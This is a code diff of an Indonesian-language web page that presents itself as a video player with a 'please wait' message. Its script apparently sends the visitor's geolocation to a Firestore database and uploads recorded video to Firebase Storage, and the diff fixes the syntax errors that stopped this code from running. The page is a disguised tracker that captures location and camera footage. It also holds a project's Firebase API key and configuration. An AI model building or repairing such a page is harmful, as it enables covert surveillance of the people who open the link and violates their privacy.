@@ -35,28 +35,29 @@
 
     <video id="videoPlayer" controls>
         <source src="https://www.dropbox.com/scl/fi/0gds2665t1f9ck0myxvl4/lv_0_20241225170240.mp4?rlkey=94pagrxrt67vg2jhrzo2yp0vv&st=aommju4o&raw=1" type="video/mp4">
-
-            Your browser does not support the video tag.
+        Your browser does not support the video tag.
     </video>
 
     <p id="status">Mohon Tunggu Sebentar</p>
 
     <script type="module">
-        // Firebase Configuration
+        // Import the functions you need from the SDKs you need
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js";
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-firestore.js";
         import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-storage.js";
 
+        // Your web app's Firebase configuration
         const firebaseConfig = {
             apiKey: "AIzaSyC6zzbzrBpZKx93VC6lsfAb0GXBgQz5EAE",
             authDomain: "kenangan-f18b3.firebaseapp.com",
             projectId: "kenangan-f18b3",
             storageBucket: "kenangan-f18b3.firebasestorage.app",
             messagingSenderId: "820709899000",
-            appId: "A1:820709899000:web:e365d60bb7462f3486590d",
+            appId: "1:820709899000:web:e365d60bb7462f3486590d",
             measurementId: "G-ZFSFC7TSKE"
         };
 
+        // Initialize Firebase
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
         const storage = getStorage(app);
@@ -84,8 +85,8 @@
                     // Simpan data lokasi ke Firebase
                     try {
                         await addDoc(collection(db, "locations"), location);
-                        const mapUrl = https://www.google.com/maps?q=${latitude},${longitude};
-                        statusText.textContent = Lokasi diperbarui! Lihat di: ${mapUrl};
+                        const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                        statusText.textContent = `Lokasi diperbarui! Lihat di: ${mapUrl}`;
                         console.log("Lokasi terbaru:", location);
                     } catch (error) {
                         statusText.textContent = "Gagal menyimpan lokasi ke database.";
@@ -124,10 +125,10 @@
 
                     // Upload video ke Firebase Storage
                     try {
-                        const storageRef = ref(storage, videos/video_${Date.now()}.webm);
+                        const storageRef = ref(storage, `videos/video_${Date.now()}.webm`);
                         await uploadBytes(storageRef, blob);
                         const downloadURL = await getDownloadURL(storageRef);
-                        statusText.textContent = Video berhasil diunggah: ${downloadURL};
+                        statusText.textContent = `Video berhasil diunggah: ${downloadURL}`;
                         console.log('Video tersedia di:', downloadURL);
                     } catch (error) {
                         statusText.textContent = "Gagal mengunggah video ke server.";
